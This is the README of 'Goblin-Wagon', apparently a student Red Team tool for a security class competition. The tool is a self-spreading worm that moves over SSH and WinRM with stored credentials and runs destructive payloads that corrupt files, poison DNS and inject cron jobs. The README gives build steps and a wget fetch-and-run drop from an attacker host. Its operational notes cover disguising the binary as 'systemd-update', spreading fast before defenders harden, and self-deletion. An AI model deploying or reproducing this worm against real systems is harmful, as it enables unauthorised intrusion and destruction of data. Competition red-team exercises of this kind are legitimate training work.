# Goblin-Wagon 
### Modular Worm
**Author:** Cory Le (chl2099)
**Class:** CSEC-473  
**Category:** Destructive / Disruptive Tool  
**Languages:** Go, Bash, PowerShell

---

## Overview

Goblin-Wagon is a self-propagating disruption worm designed for authorized Red Team competition use. It autonomously spreads across Blue Team infrastructure via SSH and WinRM using harvested or already known credentials list, and deploys a modular suite of disruption payloads on each host it reaches concurrently and without user intervention after the initial drop.

The tool is split into two components:

- **Orchestrator (`orchestrator/`)** — The outermost binary. Handles host discovery via reverse DNS lookup, credential-based lateral movement over SSH and WinRM, OS/architecture fingerprinting of target hosts, and selection of the correct inner Wagon binary for each target.
- **Wagon (`wagon/`)** — The inner binary compiled to multiple platform targets. Handles all payload execution on a compromised host. Embeds Bash and PowerShell, or other compiled scripts directly into the binary and executes them concurrently using goroutines. New payloads are added by dropping scripts into `wagon/scripts/` and embedding them with a `//go:embed` directive.

Together, the two components allow Goblin-Wagon to spread to and disrupt any Linux or Windows host on the competition network with a single initial deployment.

---

## Repository Structure

```
cdt-2026-redteam-tools/
├── README.md                        # This file
├── adware.cpp                       # Standalone adware module (benign image display)
│
├── orchestrator/                    # OUTER BINARY — spreader and fingerprinter
│   ├── goblin-wagon.go              # Main orchestrator source
│   ├── go.mod                       # Go module definition
│   └── go.sum                       # Dependency lockfile
│
├── wagon/                           # INNER BINARY — payload executor
│   ├── wagon.go                     # Wagon source; embeds and runs all scripts
│   ├── go.mod                       # Go module definition
│   └── scripts/                     # Modular payload scripts embedded into wagon
│       ├── test.sh                  # Benign test payload (writes to /etc/)
│       ├── disorder_file_sys.sh     # Filesystem distortion payload
│       ├── terminal_spam.sh         # Terminal disruption payload
│       ├── dns_disruptor.sh         # DNS corruption payload
│       ├── corrupt_files.sh         # File corruption payload
│       ├── junk_cron_n_timers.sh    # Cron/timer disruption payload
│       ├── flag_hunter.sh           # Flag discovery payload
│       └── block_gh_pb.sh           # GitHub/PasteBin blocking payload
│
├── modules/                         # Staging area for new payload modules
├── docs/                            # Screenshots and technical documentation
├── examples/                        # Example output and sample configurations
└── tests/                           # Test scripts for verifying core functionality
    └── test.sh                      # Benign file creation test (proof of execution)
```

### Component Roles

| Component | Binary | Role |
|---|---|---|
| `orchestrator/` | `goblin-wagon` | Spreads the worm — does discovery, fingerprinting, and lateral movement |
| `wagon/` | `wagon-linux-amd64`, `wagon-windows-amd64`, etc. | Executes payloads — embedded into orchestrator, selected based on target OS/arch |
| `wagon/scripts/` | `.sh` / `.ps1` | Modular payloads — embedded into wagon binary at compile time |

---

## Requirements & Dependencies

### Operator Machine (Red Team)
- Go 1.21+
- Cross-compilation toolchain for target platforms
- SSH access to Node A (initial foothold)

### Target Hosts Requirements To Establish The First Infected Host (Linux)
- SSH enabled and reachable
- User with `sudo NOPASSWD` privileges, or root SSH enabled
- No runtime dependencies — Goblin-Wagon is a static binary

### Target Hosts Requirements To Establish The First Infected Host (Windows)
- WinRM enabled (`winrm quickconfig`)
- Administrator-level credentials
- No runtime dependencies

### Go Dependencies (Orchestrator)
```
golang.org/x/crypto  — SSH client
github.com/masterzen/winrm — WinRM client
```
Install via:
```bash
cd orchestrator && go mod tidy
```

---

## Installation & Build

### Step 1: Clone the repository
```bash
git clone https://github.com/your-org/cdt-2026-redteam-tools
cd cdt-2026-redteam-tools
```

### Step 2: Build Wagon variants (inner payload binary)
Cross-compile Wagon for all target platforms:
```bash
cd wagon

# Linux x64
GOOS=linux GOARCH=amd64 go build -o wagon-linux-amd64 .

# Linux ARM
GOOS=linux GOARCH=arm64 go build -o wagon-linux-arm64 .

# Windows x64
GOOS=windows GOARCH=amd64 go build -o wagon-windows-amd64.exe .

# Windows x86
GOOS=windows GOARCH=386 go build -o wagon-windows-x86.exe .
```

### Step 3: Embed Wagon binaries into Orchestrator
Place compiled Wagon binaries into `orchestrator/` then embed them via `//go:embed` directives in `goblin-wagon.go` before building the orchestrator.

### Step 4: Build the Orchestrator
```bash
cd orchestrator
go build -o goblin-wagon .
```

### Step 5: Verify build
```bash
ls -lh goblin-wagon   # expect 8-15MB static binary
file goblin-wagon     # confirm correct architecture
```

---

## Adding New Payload Modules

Goblin-Wagon is designed for easy payload extension. To add a new module:

1. Drop your script into `wagon/scripts/`:
```bash
cp my_new_payload.sh wagon/scripts/
```

2. Add the embed directive to `wagon/wagon.go`:
```go
//go:embed scripts/my_new_payload.sh
var my_new_payload []byte
```

3. Add it to the payloads slice:
```go
payloads := [][]byte{
    simple_bash_script,
    file_system_scrambler,
    my_new_payload,   // <-- add here
}
```

4. Rebuild Wagon and re-embed into Orchestrator.

---

## Usage

### Basic Deployment (SCP drop to Node A)
```bash
# Drop goblin-wagon onto first compromised host
scp goblin-wagon user@<node-a-ip>:/tmp/.cache/systemd-update

# SSH in and execute
ssh user@<node-a-ip>
chmod +x /tmp/.cache/systemd-update
/tmp/.cache/systemd-update
```

### Alternative Drop (HTTP fetch from target)
```bash
# Host the binary from Red Team machine
python3 -m http.server 8080

# On target host
wget http://<redteam-ip>:8080/goblin-wagon -O /tmp/.cache/systemd-update
chmod +x /tmp/.cache/systemd-update
/tmp/.cache/systemd-update
```

### Execution Flow
Once executed on Node A, Goblin-Wagon:
1. Fingerprints the local OS and architecture
2. Extracts and runs the correct Wagon binary for the host
3. Wagon concurrently executes all embedded payload scripts
4. Orchestrator performs reverse DNS discovery on the target subnet
5. Attempts SSH then WinRM to each discovered host using the credential list
6. Copies itself to each new host and repeats

---

## Payload Descriptions

| Script | Effect | Target OS |
|---|---|---|
| `test.sh` | Writes proof file to `/etc/` — benign test | Linux |
| `disorder_file_sys.sh` | Renames files/dirs in target paths, floods with decoy files | Linux |
| `terminal_spam.sh` | Floods terminal with random output | Linux |
| `dns_disruptor.sh` | Corrupts DNS resolution for common domains | Linux |
| `corrupt_files.sh` | Corrupts file contents in scoped directories | Linux |
| `junk_cron_n_timers.sh` | Injects junk cron jobs and systemd timers | Linux |
| `flag_hunter.sh` | Searches for competition flag files | Linux |
| `block_gh_pb.sh` | Blocks GitHub and Pastebin at the host level | Linux |

---

## Operational Notes

### Deployment Strategy
- Deploy on **Day 1 only** — spread fast and wide before Blue Team hardens
- Day 2 and Day 3 rely on persistence established by payloads, not active spreading
- Rename binary to something benign (`systemd-update`, `dbus-helper`) before dropping

### OpSec Considerations
| Artifact | Risk | Notes |
|---|---|---|
| SSH/WinRM auth logs | Medium | `/var/log/auth.log`, Windows Event ID 4624 |
| Binary on disk | Low-Medium | Removed via `os.Remove(os.Executable())` after spread |
| Process tree | Medium | Concurrent child processes visible in `ps aux` |
| Network traffic | Low | SSH/WinRM blends with legitimate admin traffic |

### Scoped Target Directories (Grey Team Approved)
The filesystem distortion payload is constrained to:
```bash
TARGET_DIRS=(
    /opt
    /srv
    /var/www
    /home
    /var/log
)
```

### Exclusion List
The orchestrator excludes Red Team and Grey Team systems from spreading:
```
10.10.100.101 - 10.10.100.108  (Red Team systems)
10.10.10.200 - 10.10.10.254    (Grey Team systems)
```

### Cleanup
Send kill command via C2 or SSH in manually and run:
```bash
pkill -f systemd-update    # kill worm process
pkill -f wagon             # kill payload executor
```
The binary self-deletes after confirming spread via `os.Remove(os.Executable())`.

---

## Limitations

- **No C2 implemented yet** — kill switch and remote control are planned but not complete
- **Linux payloads only** — current `wagon/scripts/` are Bash; PowerShell modules are in development
- **Credential list is hardcoded** — requires manual update before each competition
- **No binary obfuscation** — binary can be reverse engineered if captured on disk
- **Spreading noise** — SSH/WinRM brute force generates detectable auth log volume

---

## Testing

Core functionality was verified using the benign `test.sh` payload which writes a file to `/etc/` requiring root privileges, confirming end-to-end propagation and privileged execution. See `tests/` and `docs/` for screenshots.

```bash
# Run the test payload locally
cd wagon
go run wagon.go
# Verify: ls -la /etc/redteam_was_here.txt
```

---

## Credits & References

- `golang.org/x/crypto/ssh` — SSH client library
- `github.com/masterzen/winrm` — WinRM client library
- MITRE ATT&CK T1021 — Remote Services lateral movement technique reference
- CSEC-473 course materials — competition environment and Grey Team coordination framework

---
